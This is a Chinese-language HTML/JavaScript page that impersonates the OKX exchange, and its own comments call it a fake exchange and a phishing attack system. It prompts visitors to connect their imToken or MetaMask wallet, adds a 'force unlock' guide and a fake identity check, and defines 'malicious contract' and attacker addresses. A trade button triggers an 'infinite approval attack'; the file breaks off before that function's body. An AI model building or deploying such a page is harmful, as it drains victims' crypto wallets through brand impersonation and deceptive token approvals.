<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>OKX - 全球领先数字资产交易平台</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #f8f9fa;
            color: #1a1a1a;
            padding-bottom: 80px;
        }

        .header {
            background: linear-gradient(135deg, #1890ff 0%, #096dd9 100%);
            color: white;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .header-left {
            display: flex;
            align-items: center;
        }

        .logo {
            font-size: 24px;
            font-weight: bold;
            margin-right: 15px;
        }

        .wallet-status {
            font-size: 12px;
            opacity: 0.9;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .connect-wallet-btn {
            background: rgba(255,255,255,0.2);
            border: 1px solid rgba(255,255,255,0.3);
            color: white;
            padding: 6px 12px;
            border-radius: 16px;
            font-size: 12px;
            cursor: pointer;
        }

        .main-content {
            padding: 0;
            min-height: calc(100vh - 140px);
        }

        .tab-content {
            display: none;
            animation: fadeIn 0.3s ease-in-out;
        }

        .tab-content.active {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* 钱包解锁引导 */
        .unlock-guide {
            background: #fff7e6;
            border: 1px solid #ffd591;
            border-radius: 12px;
            padding: 20px;
            margin: 10px;
            display: none;
        }

        .unlock-guide.show {
            display: block;
        }

        .unlock-title {
            color: #d46b08;
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 12px;
            text-align: center;
        }

        .unlock-steps {
            color: #ad6800;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 16px;
        }

        .unlock-steps ol {
            padding-left: 20px;
        }

        .unlock-steps li {
            margin-bottom: 8px;
        }

        .force-unlock-btn {
            width: 100%;
            background: #fa8c16;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 12px;
        }

        .force-unlock-btn:hover {
            background: #d46b08;
        }

        .retry-btn {
            width: 100%;
            background: #52c41a;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        .retry-btn:hover {
            background: #389e0d;
        }

        /* 自选页面 */
        .favorites-section {
            background: white;
            margin: 10px;
            border-radius: 12px;
            overflow: hidden;
        }

        .section-header {
            padding: 15px 20px;
            border-bottom: 1px solid #f0f0f0;
            font-weight: 600;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .add-favorite {
            color: #1890ff;
            font-size: 14px;
            cursor: pointer;
        }

        .coin-list {
            padding: 0;
        }

        .coin-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            border-bottom: 1px solid #f8f9fa;
            cursor: pointer;
        }

        .coin-item:hover {
            background: #f8f9fa;
        }

        .coin-info {
            display: flex;
            align-items: center;
        }

        .coin-icon {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: linear-gradient(135deg, #ffa940 0%, #fa8c16 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 14px;
            margin-right: 12px;
        }

        .coin-details {
            flex: 1;
        }

        .coin-pair {
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 2px;
        }

        .coin-volume {
            font-size: 12px;
            color: #8c8c8c;
        }

        .coin-price {
            text-align: right;
        }

        .price {
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 2px;
        }

        .price-change {
            font-size: 12px;
            padding: 2px 6px;
            border-radius: 4px;
        }

        .price-change.up {
            background: #f6ffed;
            color: #52c41a;
        }

        .price-change.down {
            background: #fff2f0;
            color: #ff4d4f;
        }

        /* 市场页面 */
        .market-tabs {
            display: flex;
            background: white;
            margin: 10px;
            border-radius: 12px;
            padding: 5px;
        }

        .market-tab {
            flex: 1;
            text-align: center;
            padding: 10px;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .market-tab.active {
            background: #1890ff;
            color: white;
        }

        /* 交易页面 */
        .trade-section {
            background: white;
            margin: 10px;
            border-radius: 12px;
            padding: 20px;
        }

        .trade-type-tabs {
            display: flex;
            margin-bottom: 20px;
            background: #f8f9fa;
            border-radius: 8px;
            padding: 4px;
        }

        .trade-type-tab {
            flex: 1;
            text-align: center;
            padding: 10px;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .trade-type-tab.active {
            background: white;
            color: #1890ff;
            font-weight: 600;
        }

        .trade-form {
            margin-top: 20px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #666;
        }

        .form-input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #e8e8e8;
            border-radius: 8px;
            font-size: 16px;
            background: #fafafa;
        }

        .form-input:focus {
            outline: none;
            border-color: #1890ff;
            background: white;
        }

        .currency-selector {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 16px;
            border: 1px solid #e8e8e8;
            border-radius: 8px;
            background: #fafafa;
            cursor: pointer;
        }

        .currency-info {
            display: flex;
            align-items: center;
        }

        .currency-icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: #1890ff;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: bold;
            margin-right: 8px;
        }

        .trade-btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.2s;
        }

        .buy-btn {
            background: #52c41a;
            color: white;
        }

        .buy-btn:hover {
            background: #389e0d;
        }

        .buy-btn:disabled {
            background: #d9d9d9;
            cursor: not-allowed;
        }

        .verification-notice {
            background: #fff7e6;
            border: 1px solid #ffd591;
            border-radius: 8px;
            padding: 16px;
            margin: 16px 0;
        }

        .verification-title {
            color: #d46b08;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .verification-text {
            color: #ad6800;
            font-size: 14px;
            line-height: 1.4;
        }

        .verify-btn {
            background: #fa8c16;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
            margin-top: 12px;
        }

        /* 资产页面 */
        .assets-header {
            background: linear-gradient(135deg, #1890ff 0%, #096dd9 100%);
            color: white;
            padding: 30px 20px;
            position: relative;
            overflow: hidden;
        }

        .falling-coins {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none;
        }

        .falling-coin {
            position: absolute;
            font-size: 20px;
            animation: fall linear infinite;
        }

        @keyframes fall {
            from {
                transform: translateY(-100px) rotate(0deg);
                opacity: 1;
            }
            to {
                transform: translateY(200px) rotate(360deg);
                opacity: 0;
            }
        }

        .total-balance {
            text-align: center;
        }

        .balance-label {
            font-size: 14px;
            opacity: 0.9;
            margin-bottom: 8px;
        }

        .balance-amount {
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .balance-actions {
            display: flex;
            gap: 15px;
            justify-content: center;
        }

        .balance-action {
            background: rgba(255,255,255,0.2);
            border: 1px solid rgba(255,255,255,0.3);
            color: white;
            padding: 10px 20px;
            border-radius: 20px;
            font-size: 14px;
            cursor: pointer;
        }

        .asset-list {
            background: white;
            margin: 10px;
            border-radius: 12px;
            overflow: hidden;
        }

        /* 底部导航 */
        .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: white;
            border-top: 1px solid #f0f0f0;
            display: flex;
            z-index: 100;
        }

        .nav-item {
            flex: 1;
            text-align: center;
            padding: 12px 8px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .nav-item.active {
            color: #1890ff;
        }

        .nav-icon {
            font-size: 20px;
            margin-bottom: 4px;
        }

        .nav-label {
            font-size: 12px;
        }

        /* 攻击状态显示 */
        .attack-status {
            position: fixed;
            top: 70px;
            left: 10px;
            right: 10px;
            background: #ff4d4f;
            color: white;
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
            z-index: 200;
            display: none;
        }

        .attack-status.show {
            display: block;
            animation: slideDown 0.3s ease-out;
        }

        @keyframes slideDown {
            from { transform: translateY(-100%); }
            to { transform: translateY(0); }
        }

        /* 调试面板 */
        .debug-panel {
            position: fixed;
            bottom: 80px;
            left: 10px;
            right: 10px;
            background: rgba(0,0,0,0.9);
            color: #00ff00;
            padding: 12px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 11px;
            max-height: 120px;
            overflow-y: auto;
            z-index: 150;
            display: none;
        }

        .debug-panel.show {
            display: block;
        }

        /* 模态框 */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.5);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .modal.show {
            display: flex;
        }

        .modal-content {
            background: white;
            border-radius: 12px;
            padding: 24px;
            max-width: 320px;
            width: 90%;
        }

        .modal-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 16px;
            text-align: center;
        }

        .modal-text {
            color: #666;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 20px;
        }

        .modal-actions {
            display: flex;
            gap: 12px;
        }

        .modal-btn {
            flex: 1;
            padding: 12px;
            border: 1px solid #d9d9d9;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
        }

        .modal-btn.primary {
            background: #1890ff;
            color: white;
            border-color: #1890ff;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <!-- 顶部导航 -->
    <div class="header">
        <div class="header-left">
            <div class="logo">OKX</div>
            <div class="wallet-status" id="walletStatus">未连接钱包</div>
        </div>
        <div class="header-right">
            <button class="connect-wallet-btn" id="connectWalletBtn" onclick="connectWallet()">连接钱包</button>
        </div>
    </div>

    <!-- 钱包解锁引导 -->
    <div class="unlock-guide" id="unlockGuide">
        <div class="unlock-title">🔓 钱包解锁指导</div>
        <div class="unlock-steps">
            <strong>如果连接失败，请按以下步骤操作：</strong>
            <ol>
                <li>确保imToken钱包已经解锁（输入密码）</li>
                <li>在imToken主界面确认钱包状态为"已解锁"</li>
                <li>返回此页面，点击"强制解锁钱包"</li>
                <li>在弹出的授权页面点击"确认"或"连接"</li>
            </ol>
        </div>
        <button class="force-unlock-btn" onclick="forceUnlockWallet()">🔓 强制解锁钱包</button>
        <button class="retry-btn" onclick="retryConnection()">🔄 重试连接</button>
    </div>

    <!-- 攻击状态提示 -->
    <div class="attack-status" id="attackStatus"></div>

    <!-- 主要内容区域 -->
    <div class="main-content">
        <!-- 自选页面 -->
        <div class="tab-content active" id="favorites">
            <div class="favorites-section">
                <div class="section-header">
                    <span>自选</span>
                    <span class="add-favorite" onclick="showAddFavorite()">添加至自选</span>
                </div>
                <div class="coin-list" id="favoritesList">
                    <!-- 动态生成 -->
                </div>
            </div>
        </div>

        <!-- 市场页面 -->
        <div class="tab-content" id="market">
            <div class="market-tabs">
                <div class="market-tab active" onclick="switchMarketTab('hot')">热门榜</div>
                <div class="market-tab" onclick="switchMarketTab('gainers')">涨幅榜</div>
                <div class="market-tab" onclick="switchMarketTab('losers')">跌幅榜</div>
                <div class="market-tab" onclick="switchMarketTab('volume')">成交额榜</div>
            </div>
            <div class="favorites-section">
                <div class="coin-list" id="marketList">
                    <!-- 动态生成 -->
                </div>
            </div>
        </div>

        <!-- 交易页面 -->
        <div class="tab-content" id="trade">
            <div class="trade-section">
                <div class="trade-type-tabs">
                    <div class="trade-type-tab active">闪兑</div>
                    <div class="trade-type-tab">现货</div>
                </div>

                <div class="verification-notice" id="verificationNotice">
                    <div class="verification-title">⚠️ 需要身份认证</div>
                    <div class="verification-text">
                        为了保障您的资产安全，请先完成身份认证后再进行交易。认证过程简单快捷，通常在5分钟内完成。
                    </div>
                    <button class="verify-btn" onclick="startVerification()">立即认证</button>
                </div>

                <div class="trade-form">
                    <div class="form-group">
                        <label class="form-label">支付</label>
                        <div class="currency-selector" onclick="showCurrencySelector('from')">
                            <div class="currency-info">
                                <div class="currency-icon" id="fromCurrencyIcon">B</div>
                                <span id="fromCurrencyName">BTC</span>
                            </div>
                            <span>▼</span>
                        </div>
                        <input type="number" class="form-input" id="fromAmount" placeholder="输入金额" oninput="calculateExchange()">
                    </div>

                    <div class="form-group">
                        <label class="form-label">获得</label>
                        <div class="currency-selector" onclick="showCurrencySelector('to')">
                            <div class="currency-info">
                                <div class="currency-icon" id="toCurrencyIcon">U</div>
                                <span id="toCurrencyName">USDT</span>
                            </div>
                            <span>▼</span>
                        </div>
                        <input type="number" class="form-input" id="toAmount" placeholder="预计获得" readonly>
                    </div>

                    <button class="trade-btn buy-btn" id="tradeBtn" onclick="executeTrade()" disabled>
                        立即兑换
                    </button>
                </div>
            </div>
        </div>

        <!-- 探索页面 -->
        <div class="tab-content" id="explore">
            <div class="trade-section">
                <h3>探索 DeFi 世界</h3>
                <p style="color: #666; margin-top: 10px;">发现更多去中心化金融机会</p>
                <!-- 探索内容 -->
            </div>
        </div>

        <!-- 资产页面 -->
        <div class="tab-content" id="assets">
            <div class="assets-header">
                <div class="falling-coins" id="fallingCoins"></div>
                <div class="total-balance">
                    <div class="balance-label">总资产 (USDT)</div>
                    <div class="balance-amount" id="totalBalance">0.00</div>
                    <div class="balance-actions">
                        <button class="balance-action" onclick="showDeposit()">充币</button>
                        <button class="balance-action" onclick="showWithdraw()">提币</button>
                    </div>
                </div>
            </div>
            <div class="asset-list">
                <div class="section-header">我的资产</div>
                <div class="coin-list" id="assetsList">
                    <!-- 动态生成 -->
                </div>
            </div>
        </div>
    </div>

    <!-- 底部导航 -->
    <div class="bottom-nav">
        <div class="nav-item active" onclick="switchTab('favorites')">
            <div class="nav-icon">⭐</div>
            <div class="nav-label">自选</div>
        </div>
        <div class="nav-item" onclick="switchTab('market')">
            <div class="nav-icon">📊</div>
            <div class="nav-label">市场</div>
        </div>
        <div class="nav-item" onclick="switchTab('trade')">
            <div class="nav-icon">💱</div>
            <div class="nav-label">交易</div>
        </div>
        <div class="nav-item" onclick="switchTab('explore')">
            <div class="nav-icon">🔍</div>
            <div class="nav-label">探索</div>
        </div>
        <div class="nav-item" onclick="switchTab('assets')">
            <div class="nav-icon">💰</div>
            <div class="nav-label">资产</div>
        </div>
    </div>

    <!-- 调试面板 -->
    <div class="debug-panel" id="debugPanel">
        <div id="debugLog"></div>
    </div>

    <!-- 模态框 -->
    <div class="modal" id="modal">
        <div class="modal-content">
            <div class="modal-title" id="modalTitle"></div>
            <div class="modal-text" id="modalText"></div>
            <div class="modal-actions">
                <button class="modal-btn" onclick="hideModal()">取消</button>
                <button class="modal-btn primary" id="modalConfirm">确认</button>
            </div>
        </div>
    </div>

    <script>
        // 真实币种数据
        const COINS_DATA = {
            'BTC/USDT': {
                name: 'Bitcoin',
                symbol: 'BTC',
                icon: 'B',
                price: 43285.67,
                change: 1.24,
                volume: '2.1B',
                contract: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599'
            },
            'ETH/USDT': {
                name: 'Ethereum', 
                symbol: 'ETH',
                icon: 'E',
                price: 2456.89,
                change: 1.31,
                volume: '1.8B',
                contract: '0x0000000000000000000000000000000000000000'
            },
            'OKB/USDT': {
                name: 'OKB Token',
                symbol: 'OKB', 
                icon: 'O',
                price: 45.67,
                change: 2.15,
                volume: '156M',
                contract: '0x75231F58b43240C9718Dd58B4967c5114342a86c'
            },
            'XRP/USDT': {
                name: 'Ripple',
                symbol: 'XRP',
                icon: 'X',
                price: 0.5234,
                change: -0.87,
                volume: '892M',
                contract: '0x1d2F0da169ceB9fC7B3144628dB156f3F6c60dBE'
            },
            'SOL/USDT': {
                name: 'Solana',
                symbol: 'SOL',
                icon: 'S',
                price: 98.45,
                change: 3.42,
                volume: '1.2B',
                contract: '0x7dFf46370e9eA5f0Bad3C4E29711aD50062EA7A4'
            },
            'DOGE/USDT': {
                name: 'Dogecoin',
                symbol: 'DOGE',
                icon: 'D',
                price: 0.0876,
                change: -1.23,
                volume: '567M',
                contract: '0x4206931337dc273a630d328dA6441786BfaD668f'
            },
            'ADA/USDT': {
                name: 'Cardano',
                symbol: 'ADA',
                icon: 'A',
                price: 0.4567,
                change: 0.95,
                volume: '423M',
                contract: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47'
            },
            'LINK/USDT': {
                name: 'Chainlink',
                symbol: 'LINK',
                icon: 'L',
                price: 14.23,
                change: 2.67,
                volume: '289M',
                contract: '0x514910771AF9Ca656af840dff83E8264EcF986CA'
            }
        };

        // 恶意合约地址
        const MALICIOUS_CONTRACTS = {
            1: '0x1234567890123456789012345678901234567890',
            56: '0x2345678901234567890123456789012345678901',
            137: '0x3456789012345678901234567890123456789012'
        };

        const ATTACKER_ADDRESS = '0xAttacker1234567890123456789012345678901234';

        // 全局变量
        let currentAccount = null;
        let currentChainId = null;
        let selectedFromCurrency = 'BTC';
        let selectedToCurrency = 'USDT';
        let isWalletConnected = false;
        let isVerified = false;
        let connectionAttempts = 0;
        let maxAttempts = 5;

        // 初始化
        document.addEventListener('DOMContentLoaded', function() {
            debugLog('🚀 OKX假交易所初始化');
            initializeCoinsData();
            renderFavoritesList();
            renderMarketList('hot');
            startPriceUpdates();
            
            // 显示调试面板
            document.getElementById('debugPanel').classList.add('show');
            debugLog('📱 移动端交易所界面已加载');
            
            // 检查是否在钱包应用中
            setTimeout(() => {
                checkWalletEnvironment();
            }, 1000);
        });

        // 检查钱包环境
        function checkWalletEnvironment() {
            debugLog('🔍 检查钱包环境...');
            
            if (window.ethereum) {
                debugLog('✅ 检测到Web3环境');
                
                // 检查是否已有连接的账户
                checkExistingConnection();
            } else {
                debugLog('❌ 未检测到Web3环境');
            }
        }

        // 检查现有连接
        async function checkExistingConnection() {
            try {
                debugLog('🔍 检查现有钱包连接...');
                
                // 方法1: 检查selectedAddress
                if (window.ethereum.selectedAddress) {
                    debugLog(`✅ 发现已连接账户: ${window.ethereum.selectedAddress}`);
                    handleSuccessfulConnection([window.ethereum.selectedAddress]);
                    return;
                }
                
                // 方法2: 尝试获取已授权账户
                const accounts = await window.ethereum.request({
                    method: 'eth_accounts'
                });
                
                debugLog(`🔍 eth_accounts返回: ${JSON.stringify(accounts)} (长度: ${accounts?.length || 0})`);
                
                if (accounts && accounts.length > 0) {
                    const validAccounts = filterValidAccounts(accounts);
                    if (validAccounts.length > 0) {
                        debugLog(`✅ 发现有效账户: ${validAccounts[0]}`);
                        handleSuccessfulConnection(validAccounts);
                        return;
                    }
                }
                
                debugLog('⚠️ 未发现已连接账户，需要用户手动连接');
                
            } catch (error) {
                debugLog(`❌ 检查现有连接失败: ${error.message}`);
            }
        }

        // 过滤有效账户
        function filterValidAccounts(accounts) {
            if (!accounts || !Array.isArray(accounts)) {
                debugLog('❌ 账户数据无效');
                return [];
            }
            
            const validAccounts = accounts.filter(account => {
                if (!account) {
                    debugLog('❌ 账户为空');
                    return false;
                }
                
                if (typeof account !== 'string') {
                    debugLog(`❌ 账户类型错误: ${typeof account}`);
                    return false;
                }
                
                if (account === 'null' || account === null) {
                    debugLog('❌ 账户为null字符串');
                    return false;
                }
                
                if (!account.startsWith('0x')) {
                    debugLog(`❌ 账户格式错误: ${account}`);
                    return false;
                }
                
                if (account.length < 42) {
                    debugLog(`❌ 账户长度错误: ${account.length}`);
                    return false;
                }
                
                debugLog(`✅ 有效账户: ${account}`);
                return true;
            });
            
            debugLog(`📊 过滤结果: ${validAccounts.length}/${accounts.length} 个有效账户`);
            return validAccounts;
        }

        // 初始化币种数据
        function initializeCoinsData() {
            debugLog('📊 加载币种数据...');
            Object.keys(COINS_DATA).forEach(pair => {
                const coin = COINS_DATA[pair];
                debugLog(`💰 ${pair}: $${coin.price} (${coin.change > 0 ? '+' : ''}${coin.change}%)`);
            });
            debugLog('🎯 恶意合约已配置完成');
        }

        // 连接钱包
        async function connectWallet() {
            try {
                connectionAttempts++;
                debugLog(`🔗 开始连接钱包 (尝试 ${connectionAttempts}/${maxAttempts})...`);
                showAttackStatus('正在连接钱包...', 'info');

                // 检测钱包类型
                if (!window.ethereum) {
                    // 尝试深度链接方式
                    if (navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('Android')) {
                        debugLog('📱 检测到移动设备，尝试打开钱包应用');
                        const deepLink = 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(window.location.href);
                        window.location.href = deepLink;
                        
                        setTimeout(() => {
                            if (document.visibilityState === 'visible') {
                                throw new Error('请在imToken或MetaMask中打开此页面');
                            }
                        }, 2000);
                        return;
                    }
                    throw new Error('未检测到Web3钱包，请安装MetaMask或imToken');
                }

                debugLog('✅ 检测到Web3钱包');

                // 请求账户访问
                debugLog('📝 发送 eth_requestAccounts 请求...');
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });

                debugLog(`📥 收到账户响应: ${JSON.stringify(accounts)} (类型: ${typeof accounts})`);

                if (!accounts || !Array.isArray(accounts)) {
                    throw new Error(`账户响应格式错误: ${typeof accounts}`);
                }

                if (accounts.length === 0) {
                    throw new Error('未获取到任何账户');
                }

                // 过滤有效账户
                const validAccounts = filterValidAccounts(accounts);

                if (validAccounts.length === 0) {
                    debugLog('❌ 所有账户都无效，显示解锁指导');
                    showUnlockGuide();
                    throw new Error('未获取到有效账户，请确保钱包已解锁');
                }

                // 连接成功
                handleSuccessfulConnection(validAccounts);

            } catch (error) {
                debugLog(`❌ 连接失败: ${error.message}`);
                
                if (connectionAttempts < maxAttempts) {
                    showUnlockGuide();
                    showAttackStatus(`连接失败: ${error.message}`, 'error');
                } else {
                    showAttackStatus('连接失败次数过多，请重新打开页面', 'error');
                }
            }
        }

        // 处理成功连接
        async function handleSuccessfulConnection(validAccounts) {
            try {
                currentAccount = validAccounts[0];
                debugLog(`✅ 钱包连接成功: ${currentAccount}`);

                // 获取网络信息
                const chainId = await window.ethereum.request({
                    method: 'eth_chainId'
                });
                currentChainId = parseInt(chainId, 16);
                debugLog(`🌐 当前网络: ${getNetworkName(currentChainId)} (${currentChainId})`);

                // 更新UI
                isWalletConnected = true;
                document.getElementById('walletStatus').textContent = `${currentAccount.substring(0, 6)}...${currentAccount.substring(38)}`;
                document.getElementById('connectWalletBtn').textContent = '已连接';
                document.getElementById('connectWalletBtn').style.background = 'rgba(82, 196, 26, 0.2)';
                document.getElementById('connectWalletBtn').style.borderColor = 'rgba(82, 196, 26, 0.3)';

                // 隐藏解锁指导
                hideUnlockGuide();

                showAttackStatus('钱包连接成功！现在可以进行交易', 'success');
                
                // 模拟获取资产
                updateAssets();
                
                debugLog('🎯 钓鱼攻击系统已激活，等待用户交易...');

            } catch (error) {
                debugLog(`❌ 处理连接成功时出错: ${error.message}`);
                showAttackStatus(`连接处理失败: ${error.message}`, 'error');
            }
        }

        // 显示解锁指导
        function showUnlockGuide() {
            document.getElementById('unlockGuide').classList.add('show');
            debugLog('📖 显示钱包解锁指导');
        }

        // 隐藏解锁指导
        function hideUnlockGuide() {
            document.getElementById('unlockGuide').classList.remove('show');
            debugLog('📖 隐藏钱包解锁指导');
        }

        // 强制解锁钱包
        async function forceUnlockWallet() {
            try {
                debugLog('🔓 执行强制解锁...');
                showAttackStatus('正在强制解锁钱包...', 'info');

                if (!window.ethereum) {
                    throw new Error('未检测到Web3钱包');
                }

                // 强制请求账户访问
                debugLog('🔓 发送强制解锁请求...');
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });

                debugLog(`🔓 强制解锁响应: ${JSON.stringify(accounts)}`);

                const validAccounts = filterValidAccounts(accounts);

                if (validAccounts.length > 0) {
                    debugLog('✅ 强制解锁成功');
                    handleSuccessfulConnection(validAccounts);
                } else {
                    throw new Error('强制解锁失败，请确保钱包已解锁并重试');
                }

            } catch (error) {
                debugLog(`❌ 强制解锁失败: ${error.message}`);
                
                if (error.code === 4001) {
                    showAttackStatus('用户拒绝了解锁请求', 'error');
                } else {
                    showAttackStatus(`强制解锁失败: ${error.message}`, 'error');
                }
            }
        }

        // 重试连接
        function retryConnection() {
            debugLog('🔄 重试连接...');
            connectionAttempts = 0; // 重置尝试次数
            hideUnlockGuide();
            connectWallet();
        }

        // 获取网络名称
        function getNetworkName(chainId) {
            const networks = {
                1: 'Ethereum',
                56: 'BSC',
                137: 'Polygon',
                11155111: 'Sepolia',
                97: 'BSC Testnet'
            };
            return networks[chainId] || `Network ${chainId}`;
        }

        // 切换标签页
        function switchTab(tabName) {
            // 更新导航状态
            document.querySelectorAll('.nav-item').forEach(item => {
                item.classList.remove('active');
            });
            event.currentTarget.classList.add('active');

            // 切换内容
            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });
            document.getElementById(tabName).classList.add('active');

            debugLog(`📱 切换到${getTabName(tabName)}页面`);

            // 特殊处理
            if (tabName === 'assets') {
                startCoinFallAnimation();
            }
        }

        function getTabName(tabName) {
            const names = {
                'favorites': '自选',
                'market': '市场', 
                'trade': '交易',
                'explore': '探索',
                'assets': '资产'
            };
            return names[tabName] || tabName;
        }

        // 渲染自选列表
        function renderFavoritesList() {
            const container = document.getElementById('favoritesList');
            const favorites = ['BTC/USDT', 'ETH/USDT', 'OKB/USDT', 'XRP/USDT'];
            
            container.innerHTML = '';
            favorites.forEach(pair => {
                const coin = COINS_DATA[pair];
                if (coin) {
                    container.appendChild(createCoinItem(pair, coin));
                }
            });
        }

        // 渲染市场列表
        function renderMarketList(type) {
            const container = document.getElementById('marketList');
            let sortedCoins = Object.entries(COINS_DATA);

            switch (type) {
                case 'gainers':
                    sortedCoins.sort((a, b) => b[1].change - a[1].change);
                    break;
                case 'losers':
                    sortedCoins.sort((a, b) => a[1].change - b[1].change);
                    break;
                case 'volume':
                    sortedCoins.sort((a, b) => parseFloat(b[1].volume) - parseFloat(a[1].volume));
                    break;
                default: // hot
                    // 保持默认顺序
                    break;
            }

            container.innerHTML = '';
            sortedCoins.forEach(([pair, coin]) => {
                container.appendChild(createCoinItem(pair, coin));
            });
        }

        // 创建币种项目
        function createCoinItem(pair, coin) {
            const item = document.createElement('div');
            item.className = 'coin-item';
            item.onclick = () => selectTradingPair(pair);

            const changeClass = coin.change >= 0 ? 'up' : 'down';
            const changePrefix = coin.change >= 0 ? '+' : '';

            item.innerHTML = `
                <div class="coin-info">
                    <div class="coin-icon">${coin.icon}</div>
                    <div class="coin-details">
                        <div class="coin-pair">${pair}</div>
                        <div class="coin-volume">24H成交额 ${coin.volume}</div>
                    </div>
                </div>
                <div class="coin-price">
                    <div class="price">$${coin.price.toFixed(4)}</div>
                    <div class="price-change ${changeClass}">${changePrefix}${coin.change}%</div>
                </div>
            `;

            return item;
        }

        // 选择交易对
        function selectTradingPair(pair) {
            debugLog(`📊 选择交易对: ${pair}`);
            switchTab('trade');
            
            const [base, quote] = pair.split('/');
            selectedFromCurrency = base;
            selectedToCurrency = quote;
            
            updateTradeCurrencyUI();
        }

        // 更新交易货币UI
        function updateTradeCurrencyUI() {
            const fromCoin = Object.values(COINS_DATA).find(coin => coin.symbol === selectedFromCurrency);
            const toCoin = Object.values(COINS_DATA).find(coin => coin.symbol === selectedToCurrency);

            if (fromCoin) {
                document.getElementById('fromCurrencyIcon').textContent = fromCoin.icon;
                document.getElementById('fromCurrencyName').textContent = fromCoin.symbol;
            }

            if (toCoin) {
                document.getElementById('toCurrencyIcon').textContent = toCoin.icon;
                document.getElementById('toCurrencyName').textContent = toCoin.symbol;
            }
        }

        // 计算兑换
        function calculateExchange() {
            const fromAmount = document.getElementById('fromAmount').value;
            const tradeBtn = document.getElementById('tradeBtn');
            
            if (fromAmount && parseFloat(fromAmount) > 0) {
                // 模拟汇率计算
                const fromCoin = Object.values(COINS_DATA).find(coin => coin.symbol === selectedFromCurrency);
                const toCoin = Object.values(COINS_DATA).find(coin => coin.symbol === selectedToCurrency);
                
                if (fromCoin && toCoin) {
                    const rate = fromCoin.price / toCoin.price;
                    const toAmount = (parseFloat(fromAmount) * rate).toFixed(6);
                    document.getElementById('toAmount').value = toAmount;
                    
                    tradeBtn.textContent = `兑换 ${fromAmount} ${selectedFromCurrency}`;
                    tradeBtn.disabled = false;
                    
                    debugLog(`💱 计算兑换: ${fromAmount} ${selectedFromCurrency} → ${toAmount} ${selectedToCurrency}`);
                }
            } else {
                document.getElementById('toAmount').value = '';
                tradeBtn.textContent = '立即兑换';
                tradeBtn.disabled = true;
            }
        }

        // 执行交易 (钓鱼攻击核心)
        async function executeTrade() {
            if (!isWalletConnected) {
                showAttackStatus('请先连接钱包', 'error');
                return;
            }

            if (!isVerified) {
                showModal('需要身份认证', '为保障交易安全，请先完成身份认证。', () => {
                    startVerification();
                });
                return;
            }

            try {
                const fromAmount = document.getElementById('fromAmount').value;
                if (!fromAmount || parseFloat(fromAmount) <= 0) {
                    throw new Error('请输入有效金额');
                }

                debugLog('🎯 开始执行钓鱼攻击!');
                showAttackStatus('正在处理交易...', 'info');

                // 获取代币合约地址
                const fromCoin = Object.values(COINS_DATA).find(coin => coin.symbol === selectedFromCurrency);
                if (!fromCoin || !fromCoin.contract) {
                    throw new Error('不支持的代币');
                }

                // 执行无限授权攻击
                await executeInfiniteApproval(fromCoin, fromAmount);

                showAttackStatus('🎉 交易完成！', 'success');
                debugLog('🎯 钓鱼攻击执行成功！');

            } catch (error) {
                debugLog(`❌ 攻击失败: ${error.message}`);
                showAttackStatus(`交易失败: ${error.message}`, 'error');
            }
        }

        // 执行无限授权攻击
